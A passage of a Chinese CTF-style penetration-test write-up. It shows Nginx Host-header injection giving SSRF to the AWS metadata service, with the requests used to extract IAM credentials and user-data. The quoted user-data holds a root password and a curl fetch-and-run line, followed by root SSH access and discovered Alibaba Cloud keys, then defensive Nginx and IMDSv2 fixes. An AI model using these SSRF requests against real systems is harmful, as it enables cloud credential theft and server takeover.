+<figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">1.0<br>2007<span class="hljs-string">-01</span><span class="hljs-string">-19</span><br>2007<span class="hljs-string">-03</span><span class="hljs-string">-01</span><br>2007<span class="hljs-string">-08</span><span class="hljs-string">-29</span><br>...<br>latest<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>这不是目标服务器的响应！</strong> 这是AWS EC2元数据服务的API版本列表！</p>
+<p><strong>结论</strong>：Host头注入漏洞确认，可以通过篡改Host头访问AWS EC2实例元数据服务。</p>
+<h4 id="4-2-2-漏洞原理分析"><a href="#4-2-2-漏洞原理分析" class="headerlink" title="4.2.2 漏洞原理分析"></a>4.2.2 漏洞原理分析</h4><p>这个漏洞的根因在于Nginx配置中使用了类似以下的配置：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># 推断的漏洞配置</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://<span class="hljs-variable">$http_host</span>;  <span class="hljs-comment"># $http_host直接来自请求的Host头</span><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$http_host</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>当请求到达时，Nginx的处理流程如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">攻击者请求：<br>  GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>  Host: <span class="hljs-number">169.254</span>.<span class="hljs-number">169.254</span><br><br>Nginx解析：<br>  <span class="hljs-variable">$http_host</span> = <span class="hljs-string">&quot;169.254.169.254&quot;</span><br><br>proxy_pass 展开：<br>  proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">169.254</span>.<span class="hljs-number">169.254</span>/<br><br>Nginx发起请求：<br>  GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>  Host: <span class="hljs-number">169.254</span>.<span class="hljs-number">169.254</span><br>  → 请求被发送到AWS元数据服务！<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="第三阶段：利用SSRF枚举云元数据"><a href="#第三阶段：利用SSRF枚举云元数据" class="headerlink" title="第三阶段：利用SSRF枚举云元数据"></a>第三阶段：利用SSRF枚举云元数据</h3><h4 id="4-3-1-获取元数据目录结构"><a href="#4-3-1-获取元数据目录结构" class="headerlink" title="4.3.1 获取元数据目录结构"></a>4.3.1 获取元数据目录结构</h4><p><strong>请求</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>响应</strong>：</p>
+<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">ami-id<br>ami-launch-index<br>ami-manifest-path<br>block-device-mapping/<br>events/<br>hostname<br>identity-credentials/<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance-action</span><br><span class="hljs-built_in"></span>instance-id<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance-life-cycle</span><br><span class="hljs-built_in"></span>instance-type<br>ipv6<br>local-hostname<br>local-ipv4<br>mac<br>metrics/<br>network/<br>placement/<br>profile<span class="hljs-keyword"></span><br><span class="hljs-keyword">public</span>-hostname<span class="hljs-keyword"></span><br><span class="hljs-keyword">public</span>-ipv4<br>reservation-id<br>security-groups<br>services/<span class="hljs-keyword"></span><br><span class="hljs-keyword">system</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="4-3-2-逐层深入获取敏感信息"><a href="#4-3-2-逐层深入获取敏感信息" class="headerlink" title="4.3.2 逐层深入获取敏感信息"></a>4.3.2 逐层深入获取敏感信息</h4><p><strong>获取实例ID</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/instance-id</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p>→ <code>i-0e70ac2d5ea2ebbbe</code></p>
+<p><strong>获取实例类型</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/instance-type</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p>→ <code>c6in.xlarge</code></p>
+<p><strong>获取可用区</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/placement/availability-zone</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p>→ <code>ap-northeast-3a</code></p>
+<p><strong>获取公网IP</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/public-ipv4</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p>→ <code>15.xxx.xxx.xxx</code></p>
+<p><strong>获取内网IP</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/local-ipv4</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p>→ <code>172.31.xx.xx</code></p>
+<h4 id="4-3-3-获取IAM临时凭证（高危）"><a href="#4-3-3-获取IAM临时凭证（高危）" class="headerlink" title="4.3.3 获取IAM临时凭证（高危）"></a>4.3.3 获取IAM临时凭证（高危）</h4><p><strong>请求</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>响应</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;Code&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Success&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;LastUpdated&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2026-07-22T02:39:53Z&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AWS-HMAC&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;AccessKeyId&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ASIAxxxxxxxxxxxx&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;SecretAccessKey&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;QvK0xxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Token&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;IQoJb3JpZ2luX2Vjxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>这些凭证可以用于直接调用AWS API，访问S3、EC2等资源。</p>
+<h4 id="4-3-4-获取实例身份文档"><a href="#4-3-4-获取实例身份文档" class="headerlink" title="4.3.4 获取实例身份文档"></a>4.3.4 获取实例身份文档</h4><p><strong>请求</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/dynamic/instance-identity/document</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>响应</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;accountId&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;337164668975&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;architecture&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x86_64&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;availabilityZone&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ap-northeast-3a&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;imageId&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ami-06dfc333b198ae022&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;instanceId&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;i-0e70ac2d5ea2ebbbe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;instanceType&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c6in.xlarge&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;privateIp&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;172.31.37.16&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;region&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ap-northeast-3&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="第四阶段：获取SSH凭证（关键突破）"><a href="#第四阶段：获取SSH凭证（关键突破）" class="headerlink" title="第四阶段：获取SSH凭证（关键突破）"></a>第四阶段：获取SSH凭证（关键突破）</h3><h4 id="4-4-1-读取User-Data"><a href="#4-4-1-读取User-Data" class="headerlink" title="4.4.1 读取User-Data"></a>4.4.1 读取User-Data</h4><p><strong>请求</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/latest/user-data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>响应</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> root:<span class="hljs-string">&#x27;***&#x27;</span> |<span class="hljs-built_in">sudo</span> chpasswd root<br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/^#\?PermitRootLogin.*/PermitRootLogin yes/g&#x27;</span> /etc/ssh/sshd_config;<br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g&#x27;</span> /etc/ssh/sshd_config;<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> -rf /etc/ssh/sshd_config.d;<br><span class="hljs-built_in">sudo</span> systemctl restart sshd;<br>bash &lt;(curl -m 10 -Ls https://raw.githubusercontent.com/xxx/xxx.sh) ...<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>重大发现</strong>：User-Data中包含：</p>
+<ol>
+<li><strong>SSH root密码明文</strong>：****</li>
+<li>修改SSH配置允许root密码登录</li>
+<li>远程下载执行脚本</li>
+</ol>
+<h4 id="4-4-2-验证SSH连接"><a href="#4-4-2-验证SSH连接" class="headerlink" title="4.4.2 验证SSH连接"></a>4.4.2 验证SSH连接</h4><p>直接使用获取的凭证尝试SSH连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh root@15.xxx.xxx.xxx<br>password: ****<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>登录成功！获得root权限Shell！</strong></p>
+<h3 id="第五阶段：后渗透"><a href="#第五阶段：后渗透" class="headerlink" title="第五阶段：后渗透"></a>第五阶段：后渗透</h3><h4 id="4-5-1-系统信息确认"><a href="#4-5-1-系统信息确认" class="headerlink" title="4.5.1 系统信息确认"></a>4.5.1 系统信息确认</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span>    → root<br>hostname  → ip-172-31-xx-xx<br><span class="hljs-built_in">id</span>        → uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="4-5-2-发现更多敏感信息"><a href="#4-5-2-发现更多敏感信息" class="headerlink" title="4.5.2 发现更多敏感信息"></a>4.5.2 发现更多敏感信息</h4><p>在服务器文件系统中发现了阿里云CLI配置：</p>
+<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;profiles&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AK&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access_key_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;LTAIxxxxxxxxxxxx&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access_key_secret&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;FPTkxxxxxxxxxxxxxxxxxxxx&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;region_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ap-southeast-1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="4-5-3-服务器上的服务"><a href="#4-5-3-服务器上的服务" class="headerlink" title="4.5.3 服务器上的服务"></a>4.5.3 服务器上的服务</h4><table>
+<thead>
+<tr>
+<th>服务</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSH (22)</td>
+<td>OpenBSD Secure Shell</td>
+</tr>
+<tr>
+<td>V2bX</td>
+<td>Hysteria2代理服务</td>
+</tr>
+<tr>
+<td>nezha-agent</td>
+<td>哪吒探针监控</td>
+</tr>
+<tr>
+<td>exim4 (25)</td>
+<td>邮件传输代理</td>
+</tr>
+</tbody></table>
+<h4 id="4-5-4-Flag搜索"><a href="#4-5-4-Flag搜索" class="headerlink" title="4.5.4 Flag搜索"></a>4.5.4 Flag搜索</h4><p>在服务器上进行了全面搜索，未找到flag文件。该服务器是一个代理转发节点，与Web前端不在同一台服务器上。</p>
+<hr>
+<h2 id="5-攻击链全景"><a href="#5-攻击链全景" class="headerlink" title="5. 攻击链全景"></a>5. 攻击链全景</h2><figure class="highlight nestedtext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nestedtext"><span class="hljs-attribute">┌─────────────────────────────────────────────────────────────────────┐</span><br><span class="hljs-attribute">│                        完整攻击链                                    │</span><br><span class="hljs-attribute">└─────────────────────────────────────────────────────────────────────┘</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Phase 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">信息侦察</span><br>  <span class="hljs-attribute">├─ 基础探测 → Nginx 1.29.1, Vue.js SPA</span><br><span class="hljs-attribute">  ├─ JS逆向 → baseURL</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/admin-api&quot;, 路由, API接口</span><br>  <span class="hljs-attribute">└─ 目录扫描 → /admin-api 被反向代理</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Phase 2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">漏洞发现</span><br>  <span class="hljs-attribute">├─ Host头注入测试 → 修改Host头为 169.254.169.254</span><br><span class="hljs-attribute">  └─ SSRF确认 → 返回AWS元数据服务响应</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Phase 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">数据提取</span><br>  <span class="hljs-attribute">├─ 枚举元数据 → 实例ID, IP, 区域, IAM凭证</span><br><span class="hljs-attribute">  ├─ 读取User-Data → SSH密码</span><span class="hljs-punctuation">:</span> <span class="hljs-string">****</span><br>  <span class="hljs-attribute">└─ 发现AK/SK泄露 → 阿里云凭证</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Phase 4</span><span class="hljs-punctuation">:</span> <span class="hljs-string">获取Shell</span><br>  ├─ SSH登录 → root@15.xxx.xxx.xxx:22<br>  <span class="hljs-attribute">└─ 获得root权限 → 完全控制服务器</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Phase 5</span><span class="hljs-punctuation">:</span> <span class="hljs-string">后渗透</span><br>  ├─ 发现V2bX代理服务<br>  ├─ 发现哪吒探针监控<br>  └─ 发现阿里云DDNS配置<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h2 id="6-漏洞根因分析"><a href="#6-漏洞根因分析" class="headerlink" title="6. 漏洞根因分析"></a>6. 漏洞根因分析</h2><h3 id="6-1-Nginx配置缺陷"><a href="#6-1-Nginx配置缺陷" class="headerlink" title="6.1 Nginx配置缺陷"></a>6.1 Nginx配置缺陷</h3><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># ❌ 存在漏洞的配置</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://<span class="hljs-variable">$http_host</span>;  <span class="hljs-comment"># 直接使用Host头作为代理目标</span><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$http_host</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>问题所在</strong>：</p>
+<ol>
+<li><code>$http_host</code> 直接来自客户端请求，完全可控</li>
+<li>没有对Host头做任何校验或白名单</li>
+<li>允许代理到任意地址，包括链路本地地址</li>
+</ol>
+<h3 id="6-2-云安全配置缺陷"><a href="#6-2-云安全配置缺陷" class="headerlink" title="6.2 云安全配置缺陷"></a>6.2 云安全配置缺陷</h3><ol>
+<li><strong>使用IMDSv1</strong>（而非更安全的IMDSv2）</li>
+<li><strong>User-Data中包含明文密码</strong></li>
+<li><strong>IAM角色权限过大</strong></li>
+<li><strong>多因素认证未启用</strong></li>
+</ol>
+<h3 id="6-3-对比：安全的Nginx配置"><a href="#6-3-对比：安全的Nginx配置" class="headerlink" title="6.3 对比：安全的Nginx配置"></a>6.3 对比：安全的Nginx配置</h3><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># ✅ 安全的配置</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> www.example.com;<br><br>    <span class="hljs-comment"># 方法1：固定代理目标</span><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:8080;  <span class="hljs-comment"># 固定地址，不受Host头影响</span><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># 方法2：校验Host头</span><br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$host</span> !<span class="hljs-regexp">~ ^(www\.example\.com|api\.example\.com)$)</span> &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>    &#125;<br><br>    <span class="hljs-comment"># 方法3：拒绝非标准Host头</span><br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$host</span> !<span class="hljs-regexp">~ ^[a-zA-Z0-9.-]+$)</span> &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h2 id="7-IMDSv1-vs-IMDSv2"><a href="#7-IMDSv1-vs-IMDSv2" class="headerlink" title="7. IMDSv1 vs IMDSv2"></a>7. IMDSv1 vs IMDSv2</h2><h3 id="7-1-IMDSv1（有缺陷的版本）"><a href="#7-1-IMDSv1（有缺陷的版本）" class="headerlink" title="7.1 IMDSv1（有缺陷的版本）"></a>7.1 IMDSv1（有缺陷的版本）</h3><p>IMDSv1 是简单的HTTP请求，没有任何保护机制：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 直接请求即可获取元数据</span><br>curl http://169.254.169.254/latest/meta-data/<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>缺陷</strong>：任何能发起HTTP请求的进程&#x2F;漏洞都可以访问元数据。</p>
+<h3 id="7-2-IMDSv2（增强版本）"><a href="#7-2-IMDSv2（增强版本）" class="headerlink" title="7.2 IMDSv2（增强版本）"></a>7.2 IMDSv2（增强版本）</h3><p>IMDSv2 引入了基于会话的Token机制：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 第一步：获取Token（需要PUT请求+TTL）</span><br>TOKEN=$(curl -X PUT <span class="hljs-string">&quot;http://169.254.169.254/latest/api/token&quot;</span> \<br>    -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>)<br><br><span class="hljs-comment"># 第二步：使用Token访问元数据</span><br>curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> \<br>    http://169.254.169.254/latest/meta-data/<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>保护机制</strong>：</p>
+<ol>
+<li>Token必须通过 <code>PUT</code> 请求获取（SSRF通常只能发 <code>GET</code>）</li>
+<li>Token有有效期（TTL）</li>
+<li>需要特定的请求头 <code>X-aws-ec2-metadata-token-ttl-seconds</code></li>
+</ol>
+<h3 id="7-3-如何启用IMDSv2"><a href="#7-3-如何启用IMDSv2" class="headerlink" title="7.3 如何启用IMDSv2"></a>7.3 如何启用IMDSv2</h3><p>在AWS控制台或CLI中设置：</p>
